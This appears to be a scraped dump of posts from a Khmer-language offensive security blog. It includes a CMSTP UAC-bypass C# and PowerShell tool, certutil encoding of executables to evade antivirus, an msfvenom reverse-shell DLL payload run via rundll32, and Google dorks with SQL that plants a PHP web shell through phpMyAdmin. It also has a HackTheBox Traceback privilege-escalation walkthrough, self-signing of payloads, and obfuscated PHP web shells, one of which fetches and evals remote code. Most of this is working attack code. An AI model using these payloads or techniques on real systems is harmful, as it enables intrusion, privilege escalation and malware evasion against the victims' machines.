public static string InfData = @\u0026#34;[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install REPLACE_COMMAND_LINE taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \u0026#34;\u0026#34;HKLM\u0026#34;\u0026#34;, \u0026#34;\u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\u0026#34;\u0026#34;, \u0026#34;\u0026#34;ProfileInstallPath\u0026#34;\u0026#34;, \u0026#34;\u0026#34;%UnexpectedError%\u0026#34;\u0026#34;, \u0026#34;\u0026#34;\u0026#34;\u0026#34; [Strings] ServiceName=\u0026#34;\u0026#34;CorpVPN\u0026#34;\u0026#34; ShortSvcName=\u0026#34;\u0026#34;CorpVPN\u0026#34;\u0026#34; \u0026#34;; [DllImport(\u0026#34;user32.dll\u0026#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); public static string BinaryPath = \u0026#34;c:\\\\windows\\\\system32\\\\cmstp.exe\u0026#34;; /* Generates a random named .inf file with command to be executed with UAC privileges */ public static string SetInfFile(string CommandToExecute) { string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(\u0026#34;.\u0026#34;))[0]; string TemporaryDir = \u0026#34;C:\\\\windows\\\\temp\u0026#34;; StringBuilder OutputFile = new StringBuilder(); OutputFile.Append(TemporaryDir); OutputFile.Append(\u0026#34;\\\\\u0026#34;); OutputFile.Append(RandomFileName); OutputFile.Append(\u0026#34;.inf\u0026#34;); StringBuilder newInfData = new StringBuilder(InfData); newInfData.Replace(\u0026#34;REPLACE_COMMAND_LINE\u0026#34;, CommandToExecute); File.WriteAllText(OutputFile.ToString(), newInfData.ToString()); return OutputFile.ToString(); } public static bool Execute(string CommandToExecute) { if(!File.Exists(BinaryPath)) { Console.WriteLine(\u0026#34;Could not find cmstp.exe binary!\u0026#34;); return false; } StringBuilder InfFile = new StringBuilder(); InfFile.Append(SetInfFile(CommandToExecute)); Console.WriteLine(\u0026#34;Payload file written to \u0026#34; + InfFile.ToString()); ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath); startInfo.Arguments = \u0026#34;/au \u0026#34; + InfFile.ToString(); startInfo.UseShellExecute = false; Process.Start(startInfo); IntPtr windowHandle = new IntPtr(); windowHandle = IntPtr.Zero; do { windowHandle = SetWindowActive(\u0026#34;cmstp\u0026#34;); } while (windowHandle == IntPtr.Zero); System.Windows.Forms.SendKeys.SendWait(\u0026#34;{ENTER}\u0026#34;); return true; } public static IntPtr SetWindowActive(string ProcessName) { Process[] target = Process.GetProcessesByName(ProcessName); if(target.Length == 0) return IntPtr.Zero; target[0].Refresh(); IntPtr WindowHandle = new IntPtr(); WindowHandle = target[0].MainWindowHandle; if(WindowHandle == IntPtr.Zero) return IntPtr.Zero; SetForegroundWindow(WindowHandle); ShowWindow(WindowHandle, 5); return WindowHandle; } }   ផ្អែកលើការងារពីមុនរបស់លោក Oddvar Moe\nផ្អែកលើ PowerShell ស្គ្រីបរបស់លោក Tyler Applebaum\nចម្លងកូដខាងលើរក្សាទុកជា \u0026ldquo;Source.cs\u0026rdquo;\nដើម្បីបំប្លែងកូដទៅជាឯកសារ dll យើងអាចប្រើពាក្យបញ្ជានៅលើ powershell ដូចខាងក្រោម៖\n1  Add-Type -TypeDefinition ([IO.File]::ReadAllText(\u0026#34;$pwd\\Source.cs\u0026#34;)) -ReferencedAssemblies \u0026#34;System.Windows.Forms\u0026#34; -OutputAssembly \u0026#34;CMSTP-UAC-Bypass.dll\u0026#34;   ក្រោយបំប្លែងរួចវានឹងបង្កើតចេញជាឯកសារមួយមានឈ្មោះថា \u0026ldquo;CMSTP-UAC-Bypass.dll\u0026rdquo;\nBypass UAC ដើម្បីប្រើប្រាស់ឯកសារ DLL ដែលបានបង្កើតរួចឲ្យដំណើរការ Bypass UAC យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3 4 5 6 7  PS C:\\\u0026gt; [Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\u0026#34;$pwd\\CMSTP-UAC-Bypass.dll\u0026#34;)) GAC Version Location --- ------- -------- False v4.0.30319 PS C:\\\u0026gt; [CMSTPBypass]::Execute(\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;)   ក្រោយពីរដំណើររួច នឹងមានលោតផ្ទាំង CMD អមមកជាមួយនិងសិទ្ធជា Administrator ។\nដូចដែលបានឃើញគឺយើងអាចធ្វើការ Bypass UAC បានសម្រេចដោយឈរនៅលើសិទ្ធិអ្នកប្រើប្រាស់ធម្មតា៕\nBonus - Bypass With PS1 (One File Action) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133  # UAC Bypass poc using SendKeys # Version 1.0 # Author: Oddvar Moe # Functions borrowed from: https://powershell.org/forums/topic/sendkeys/ # Todo: Hide window on screen for stealth # Todo: Make script edit the INF file for command to inject... Function script:Set-INFFile { [CmdletBinding()] Param ( [Parameter(HelpMessage=\u0026#34;Specify the INF file location\u0026#34;)] $InfFileLocation = \u0026#34;$env:temp\\CMSTP.inf\u0026#34;, [Parameter(HelpMessage=\u0026#34;Specify the command to launch in a UAC-privileged window\u0026#34;)] [String]$CommandToExecute = \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; #your action here ) $InfContent = @\u0026#34; [version] Signature=`$chicago`$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install $CommandToExecute taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \u0026#34;HKLM\u0026#34;, \u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\u0026#34;, \u0026#34;ProfileInstallPath\u0026#34;, \u0026#34;%UnexpectedError%\u0026#34;, \u0026#34;\u0026#34; [Strings] ServiceName=\u0026#34;CorpVPN\u0026#34; ShortSvcName=\u0026#34;CorpVPN\u0026#34; \u0026#34;@ $InfContent | Out-File $InfFileLocation -Encoding ASCII } Function Get-Hwnd { [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName ) Process { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Try { $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle } Catch { $hwnd = $null } $hash = @{ ProcessName = $ProcessName Hwnd = $hwnd } New-Object -TypeName PsObject -Property $hash } } function Set-WindowActive { [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name ) Process { $memberDefinition = @\u0026#39; [DllImport(\u0026#34;user32.dll\u0026#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); \u0026#39;@ Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32 $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd If ($hwnd) { $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0) [User32.Api]::SetForegroundWindow($hwnd) [User32.Api]::ShowWindow($hwnd, 5) } Else { [string] $hwnd = \u0026#39;N/A\u0026#39; } $hash = @{ Process = $Name Hwnd = $hwnd } New-Object -TypeName PsObject -Property $hash } } . Set-INFFile #Needs Windows forms add-type -AssemblyName System.Windows.Forms If (Test-Path $InfFileLocation) { #Command to run $ps = new-object system.diagnostics.processstartinfo \u0026#34;c:\\windows\\system32\\cmstp.exe\u0026#34; $ps.Arguments = \u0026#34;/au $InfFileLocation\u0026#34; $ps.UseShellExecute = $false #Start it [system.diagnostics.process]::Start($ps) do { # Do nothing until cmstp is an active window } until ((Set-WindowActive cmstp).Hwnd -ne 0) #Activate window Set-WindowActive cmstp #Send the Enter key [System.Windows.Forms.SendKeys]::SendWait(\u0026#34;{ENTER}\u0026#34;) }   ឯកសារដើម៖\n https://0x00-0x00.github.io tylerapplebaum  ","description":"បង្កើតស្គ្រីប powershell ដើម្បី Bypass UAC ជាមួយឯកសារ DLL","id":10,"section":"posts","tags":["dll","bypass"],"title":"Bypass UAC DLL Method","uri":"https://thiklab.com/en/posts/bypass-uac-dll-method/"},{"content":"ជាគំនិតក្នុងការបំប្លែងប្រភេទ​ឯកសារ Binary Execuable ទៅជាបណ្ដុំតួរអក្សរដែលអាចរក្សាទុកនិងទាញយកពីប្រភពខាងក្រៅបាន។\nCertutil Encode នៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូ សូមបើកផ្ទាំង Command Prompt (CMD) និងវាយបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖\n1  cmd\u0026gt; certutil -encode file.exe file.txt  \nក្រោយពីបំប្លែងរួច នោះយើងនឹងទទួលបានឯកសារមួយជាប្រភេទ Text ដូចដែលបានបង្ហាញដូចខាងក្រោម៖\n1 2 3 4 5 6 7 8  -----BEGIN CERTIFICATE----- TVp4AAEAAAAEAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA m21gKiFxNcsclCLVL6Q01cECa/UD1Am02MYPaESJirs/s/5l1TKlKGnQQLTZymuI 1ZJiqgSCbkCdi1scpPQEk+IVPuYnVa91h1qWPA4PO/G2K4M7lQqRrGdQ57i3A+yM v+8J1Zx3eaAnAxpg0FDfzyrUVS4Wc45KE9FVEJTyk706+qFXhvey4pGUSFkH1obG g3mE2SaLGbMQPkC95pNe/vfqyQ4MFgulk1HcL9XA3AyprIVj2H0ve91ip0aeIcOC rzno9vOnK3OrUKUVl9CK2s56VsHUAjmreyKs6cyUxfWUDI6is3NxuSR8AAAAAAAA -----END CERTIFICATE-----   Certutil Decode ដើម្បីបំប្លែងត្រលប់ទៅកាន់ឯកសារដើមវិញ យើងអាចវាយពាក្យបញ្ជាចូលទៅក្នុងផ្ទាំង Command Prompt ដូចខាងក្រោម៖\n1  cmd\u0026gt; certutil -decode file.txt file.exe   វិធីសាស្រ្តនេះក៏អាចជាជំនួយក្នុងការ Bypass ទៅលើការចាប់ពីកម្មវិធីកំចាត់មេរោគផងដែ៕\nប្រភព៖ docs.microsoft.com\n","description":"វិធីសាស្ត្របំប្លែង Binary File ទៅជាតួអក្សរ","id":11,"section":"posts","tags":["converter","encode","decode"],"title":"Convert ExE To Text File","uri":"https://thiklab.com/en/posts/convert-exe-to-txt/"},{"content":"Generate DLL Payload នៅក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច (Kali, Parrot) សូមបើកផ្ទាំង Terminal ហើយបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖\n1  kali@1337:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b \u0026#39;\\x00\\xff\u0026#39; -f dll \u0026gt; idm.dll   Execute DLL ឥឡូវចូលទៅកាន់ម៉ាស៊ីនវីនដូ ហើយវាយពាក្យបញ្ជាដូចខាងក្រោម៖\n1  cmd\u0026gt; c:\\Windows\\System32\\rundll32.exe c:\\Users\\Zyzz\\Desktop\\idm32.dll,xoxo   ល្បិចក្នុងការដំណើរការ DLL គឺស្ថិតនៅត្រង់សញ្ញា \u0026quot;,\u0026quot; ហើយបញ្ចប់ដោយតួរអក្សរពីក្រោយ (ដាក់អ្វីក៏បាន)។\nGet Reverse Shell តស់! ត្រលប់ទៅកាន់ផ្ទាំង Terminal វិញនោះយើងនឹងទទួលបាន Reverse Shell ពីវីនដូ៕\n","description":"របៀបដំណើរការ DLL Payload នៅលើវិនដូ","id":12,"section":"posts","tags":["dll","reverse-shell"],"title":"Execute DLL Payloads","uri":"https://thiklab.com/en/posts/exec-dll-payload/"},{"content":"Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query ចូលទៅកាន់ផ្ទាំង phpMyAdmin Database ហើយបង្កើត Database ថ្មីមួយ ឧ, \u0026ldquo;uploader\u0026rdquo; បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖\n1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   និងកូដខាងក្រោមនេះទៀត៖\n1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   បន្ទាប់មកចូលទៅកាន់ Table ឈ្មោះថា user_upload ហើយចុចត្រង់ផ្ទាំង SQL និងចម្លងចូលនូវកូដខាងក្រោម៖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(\u0026#39;\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Uploader\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\u0026#34;black\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div style=\u0026#34;color:white;margin-top:150px;\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Uploader\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;uploader.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;userfile\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\u0026#39;);   និងកូដខាងក្រោមផងដែរ\n1  select*intodumpfile\u0026#39;C:/xampp/htdocs/wkspace/up.php\u0026#39;fromuserform   ដើម្បីស្វែងរកនូវទីតាំងរបស់ Database Webserver យើងអាចប្រើ Syntax មួយនេះ \u0026ldquo;SELECT @@datadir\u0026rdquo; នៅក្នុង SQL Query SQL Cheatsheet\nក្រោយមកចម្លងចូលកូដខាងក្រោមនៅក្នុង table user_upload\n1 2 3 4 5 6  INSERTINTOuser_uploadVALUES(\u0026#34;\u0026lt;?php $uploaddir = \u0026#39;C:/xampp/htdocs/wkspace/\u0026#39;; $uploadfile = $uploaddir . basename($_FILES[\u0026#39;userfile\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;userfile\u0026#39;][\u0026#39;tmp_name\u0026#39;],$uploadfile)) { print \u0026#39;\u0026lt;body bgcolor=black\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2 style=color:white;margin-top:150px;\u0026gt;Uploaded successully.\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; } else { print \u0026#39;\u0026lt;body bgcolor=black\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2 style=color:red;margin-top:150px;\u0026gt;Uploaded Failed.\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; } ?\u0026gt;\u0026#34;)   ជាចុងក្រោយចម្លងចូលនូវកូដខាងក្រោម៖\n1  select*intodumpfile\u0026#39;C:/xampp/htdocs/wkspace/uploader.php\u0026#39;fromuser_upload   ឥឡូវសាកល្បងបើកមើល Web Shell ដែលបានបង្ហោះរួចទៅតាមទីតាំងដែលបានបញ្ចូល ជាការស្រេច។\n","description":"យល់ដឹងពីវិធីបង្ហោះ Web Shell តាមរយៈ phpMyAdmin","id":13,"section":"posts","tags":["file-upload","google-dork","phpmyadmin"],"title":"Upload Shell Via phpMyAdmin","uri":"https://thiklab.com/en/posts/upload-shell-via-phpmyadmin/"},{"content":"Recon ជាដំបូងខ្ញុំប្រើ Nmap ដើម្បីស្វែងរកផតដែលបានបើក និងសេវាកម្មដែលបានប្រើ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  :~$ sudo nmap -sC -sV 10.10.10.181 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 13:29 +07 Nmap scan report for 10.10.10.181 Host is up (0.29s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   ដូចដែលបានឃើញ គឺមានតែផតពីរប៉ុណ្នោះដែលបានបើកគឺផត ២២(ssh) និងផង ៨០(http)\nOSINT ក្រោយពីស្កេនរួចមកខ្ញុំក៏ចូលទៅកាន់អាស័យដ្ឋាន http://10.10.10.181:80 ហើយក៏បានឃើញដូចរូបដូចខាងក្រោម៖\nខ្ញុំចុច Ctrl+U ដើម្បីចូលមើលកូដខាងក្នុង ក៏ឃើញមាននូវព័ត៌មានមួយចំនួន៖\nខ្ញុំចាប់ផ្ដើមស្វែងរកឈ្មោះម្ចាស់គណនី Xh4H នៅក្នុង Google ហើយក៏បានរកឃើញនូវ Github របស់ម្ចាស់គណនី។\nបន្ទាប់មកខ្ញុំបានចូលទៅមើលក្នុង Repositories នោះហើយក៏ឃើញមាន Repository មួយមានឈ្មោះថា Web-Shells\nខ្ញុំបានសាកល្បងចូលទៅតាមឈ្មោះរបស់ Shell រហូតដល់ឯកសារឈ្មោះថា smevk.php ដែលលោតចេញនៅផ្ទាំងបំពេញបែបបត់ចូល\nលេខសំងាត់របស់វាគឺ admin/admin ខ្ញុំក៏បានចូលទៅក្នុង Web Server បានសម្រេច។\nGet User ដើម្បីបាន User Flag ជាដំបូងខ្ញុំបានចូលទៅក្នុង /home/ តាមរយៈ Web-Shell ហើយក៏ឃើញមានគណនីអ្នកប្រើប្រាស់ចំនួនពីរ sysadmin/webadmin ដោយគណនី sysadmin ខ្ញុំមិនអាចមានសិទ្ធិចូលទៅក្នុងបានទេដូចនេះខ្ញុំចូលបានតែគណនី webadmin មួយប៉ុណ្នោះ។\nក្រោយមកខ្ញុំក៏ឃើញមានថតឯកសារមួយឈ្មោះថា .ssh និង ឯងសារមួយទៀតឈ្មោះថា authorised_keys\nដូចនេះខ្ញុំក៏បានបង្កើតនៅ SSH-Key ហើយដាក់វាចូលទៅក្នុងឯកសារនោះដើម្បីមានសិទ្ធិចូលទៅកាន់ម៉ាស៊ីនមេតាមរយៈ SSH\nក្រោយពីចូលតាមរយៈ SSH រួចមកខ្ញុំបានឃើញឯកសារមួយឈ្មោះ note.txt ដែលក្នុងនោះមានអត្ថន័យថា៖\n1 2 3 4  - sysadmin - I have left a tool to practice Lua. I\u0026#39;m sure you know where to find it. Contact me if you have any question.   ខ្ញុំក៏សាកស្វែងរកមើលឯកសារនៅក្នុងនោះ ហើយក៏បានរកឃើញប្រវត្តិប្រើប្រាស់ពាក្យបញ្ជាចាស់ៗ របស់អ្នកប្រើប្រាស់ដូចខាងក្រោម៖\n1 2 3 4 5 6 7  webadmin@traceback:~$ cat .bash_history ls -la sudo -l nano privesc.lua sudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lua logout   ដោយដឹងថា luvit ជាប្រភេទ lua script ដែលមានលទ្ធិភាពក្នុងការ execute និងបើកមើលនូវរាល់ឯកសារណាដែលមាននៅក្នុងគណនី sysadmin បានដូចនេះខ្ញុំក៏បង្កើត Script តូចមួយដើម្បីចូលទៅបើកមើលឯកសារ user.txt ដែលមាននៅក្នុងគណនី sysadmin ផ្ទាល់តែម្ដង។\n1  webadmin@traceback:~$ echo \u0026#34;os.execute(\u0026#34;cat /home/sysadmin/user.txt\u0026#34;) \u0026gt; user.lua   បន្ទាប់មកខ្ញុំបានប្រើប្រាស់ឯកសារ luvit ដដែលដើម្បីបើកឯកសារ user.lua\n1 2  webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit user.lua 23c296e8cxxxxxxxxxxxxxxxxxxxxxec   ដូចនេះខ្ញុំក៏ទទួលបាន User Flag ដូចដែលបានបង្ហាញខាងលើ។\nGet Root ដោយប្រើប្រាស់ឯកសារ luvit ខ្ញុំអាចមានសិទ្ធិចូលជាគណនីរបស់ sysadmin បានដោយប្រើប្រាស់វិធីដូចខាងក្រោម៖\n1 2 3  webadmin@traceback:~$ echo \u0026#34;os.execute(\u0026#34;/bin/bash\u0026#34;) \u0026gt; sys.lua webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit sys.lua sysadmin@traceback:~$   ដូចដែលបានឃើញគឺខ្ញុំមានសិទ្ធិប្ដូរទៅជាគណនី sysadmin វិញដោយប្រើប្រាស់ Lua Script\nបន្ទាប់ពីមានសិទ្ធិជា sysadmin ហើយខ្ញុំក៏ដាក់ SSH-Key ចូលទៅក្នុងប្រអប់ .ssh ដើម្បីអាច SSH ចូលទៅក្នុងគណនី sysadmin បានដូចពីពេលមុនដែរ។\nបន្តទៀតខ្ញុំត្រូវការមើល Process របស់គណនី root ថាតើកំពុងតែប្រើពាក្យបញ្ជាអ្វីខ្លះ។ ដោយសារតែមិនមានសិទ្ធិជា root ចឹងហើយទើបជម្រើសដែលល្អបំផុតគឺប្រើប្រាស់ Tool ខាងក្រៅហើយ Tool ដែលខ្ញុំប្រើនោះគឺឈ្មោះ pspy64 ដែលវាមានលទ្ធិភាពក្នុងការមើល Process គ្រប់គណនីទាំងអស់បើទោះបីជាគ្មានសិទ្ធិជា root ក៏ដោយ។\nទាញយក៖ pspy64\nដើម្បី Upload ឯកសារនេះបានខ្ញុំត្រូវប្រើប្រាស់ពាក្យបញ្ជា scp\n1  :~$ sudo scp -i id_rsa pspy64 sysadmin@10.10.10.181:/tmp/   ខ្ញុំបានបើកដំណើរការឯកសារ pspy64 នោះ ហើយវាបានបញ្ចេញនូវព័ត៌មានដូចខាងក្រោម៖\n1 2 3 4 5 6  2020/05/21 04:02:01 CMD: UID=0 PID=6094 | sleep 30 2020/05/21 04:02:01 CMD: UID=0 PID=6093 | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/05/21 04:02:01 CMD: UID=0 PID=6092 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/05/21 04:02:01 CMD: UID=0 PID=6091 | /usr/sbin/CRON -f 2020/05/21 04:02:01 CMD: UID=0 PID=6090 | /usr/sbin/CRON -f 2020/05/21 04:02:31 CMD: UID=0 PID=6096 | /bin/cp /var/backups/.update-motd.d/ /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/   អ្វីដែលគួរឲ្យចាប់អារម្មណ៏នោះគឺត្រង់កន្លែង \u0026ldquo;/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\u0026rdquo; និង \u0026ldquo;sleep 30\u0026rdquo; មានន័យថារាល់ពេល ៣០វិនាទីម្ដងម៉ាស៊ីនមួយនេះនឹងធ្វើការថតចម្លងគ្រប់ឯកសារទាំងអស់ដែលស្ថិតនៅក្នុងថតឯកសារ /var/backups/.update-motd.d/ យកទៅដាក់ចូលទៅក្នុងថតឯកសារ /etc/update-motd.d/ ដែលជាថតឯកសារមេរបស់ម៉ាស៊ីន និង ប្រើប្រាស់ដោយម្ចាស់គណនី root។\nក្រោយពីបានចូលទៅមើលឯកសារដែលមាននៅក្នុងថតឯកសារ /etc/update-motd.d/ រួចមកខ្ញុំសង្កេតឃើញថាឯកសារដែលមានក្នុងនោះគឺជារបស់ម្ចាស់គណនី root ប៉ុន្តែម្ចាស់គណនី sysadmin ក៏អាចមានសិទ្ធិកែប្រែបានផងដែរ។\nដូចនេះខ្ញុំក៏បន្ថែមពាក្យបញ្ជាមួយបន្ទាត់ទៀត គឺ \u0026ldquo;cat /root/root.txt\u0026rdquo; ចូលទៅក្នុងឯកសារ 00-header ដែលជាឯកសារបង្ហាញផ្ទាំងក្បាលនៅពេលចូលដល់កន្លែងវាយលេខសំងាត់របស់ SSH\nនៅពេលរួចរាល់អស់ហើយខ្ញុំបានធ្វើការសាកល្បង SSH ចូលក្នុងម៉ាស៊ីនមេម្ដងទៀតហើយក៏ទទួលបាន\u0026hellip; :D\nពិតណាស់ ដូចដែលឃើញចឹងគឺខ្ញុំទទួលបាន Root Flag នៅពេលដែលចូលក្នុងម៉ាស៊ីនមេដោយប្រើ SSH៕\n","description":"សំនេររៀបរាប់អំពីការហេគម៉ាស៊ីនមេ Traceback","id":14,"section":"posts","tags":null,"title":"HackTheBox - Traceback","uri":"https://thiklab.com/en/posts/traceback-10-10-10-181/"},{"content":"Hello, I\u0026rsquo;m thik and this is my blog, written about Cybersecurity topic and Malware research.\n","description":"About author of the blog","id":15,"section":"","tags":null,"title":"About","uri":"https://thiklab.com/en/about/"},{"content":"តើមានវិធីអ្វីដែលអាចចុះហត្ថលេខាលើកូដទៅឲ្យកម្មវិធី ឫ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?\nខាងក្រោមនេះគឺជាវិធីដ៏ល្អមួយសម្រាប់ចម្លើយនៃសំនួរខាងលើ៖\nGenerate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\\CurrentUser\\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)[0] -FilePath code_signing.crt   ចំពោះលេខ [0] គឺសម្រាប់ករណីនៅពេលដែលយើងមាន Certificate ច្រើនជាងមួយ។\nImport as Trusted Publisher 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\Root   Signing Application 1  Set-AuthenticodeSignature .\\app.exe -Certificate (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)   គួរចំណាំផងដែរថា នៅពេលដែលយើងបានដំឡើងសោរនេះរួចរាល់ហើយ យើងក៏អាចចុះហត្ថលេខា ទៅឲ្យស្គ្រីបផ្សេងទៀតជាមួយវាបានផងដែរ។\nប្រភព៖ stackoverflow\nអត្ថបទទាក់ទង៖ sid-500.com\n","description":"របៀបបង្កើត Certification សម្រាប់ Code Signing","id":16,"section":"posts","tags":["code-signing"],"title":"Self Signed Certification","uri":"https://thiklab.com/en/posts/self-signed-certification/"},{"content":"USh3ll-I 1  \u0026lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system\u0026amp;0=id;ls+-la    USh3ll-II 1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\u0026#34; \u0026gt; unish3ll.php   1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\\r\u0026lt;?=\u0026#39;404 Not found\u0026#39;;?\u0026gt;\u0026#34; \u0026gt; unish3ll.php   របៀបប្រើ៖ curl localhost/unish3ll.php -d _=ls+-la\nUSh3ll-III 1  \u0026lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ\u0026amp;$ឋ[ម]($ឋ[ប]); //.php?ត=true\u0026amp;ល=រងារ\u0026amp;ម=passthru\u0026amp;ប=ls    1  \u0026lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ\u0026amp;$ឋ[ម]($ឋ[ប]); eval(\u0026#39;?\u0026gt;\u0026#39;.file_get_contents($ឋ[ដ]));?\u0026gt;   របៀបប្រើ៖ unish3ll.php?ត=true\u0026amp;ល=រងារ\u0026amp;ម=passthru\u0026amp;ប=id\u0026amp;ដ=https://pastebin.com/raw/xxxxx\nUSh3ll-IV 1  \u0026lt;?=$a=\u0026#34;sy\u0026#34;;$b=\u0026#34;stem\u0026#34;;$c=$a.$b; $c(\u0026#34;uname -a\u0026#34;); //get method    USh3ll-V 1  \u0026lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v 